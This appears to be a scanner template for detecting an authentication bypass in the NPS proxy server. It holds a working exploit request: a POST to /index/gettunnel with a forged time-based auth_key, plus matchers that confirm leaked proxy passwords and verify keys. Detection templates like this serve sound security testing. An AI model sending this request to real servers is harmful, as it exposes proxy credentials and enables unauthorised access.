id: nps-auth-bypass
brief:
    title: NPS - Authentication Bypass
    by: SleepingBag945
    level: high
    about: This will reveal all parameters configured on the NPS, including the account username and password of the proxy.
    label:
        - nps
        - auth-bypass
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/index/gettunnel'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: auth_key={{md5(unix_time())}}&timestamp={{unix_time()}}&offset=0&limit=10&type=socks5&client_id=&search=
      signs:
        - "on": word
          has:
            - '"VerifyKey":'
            - 'Password":'
            - 'Id":'
          in: body
          need: all
        - "on": word
          has:
            - application/json
          in: header
          need: all
        - "on": status
          status:
            - 200
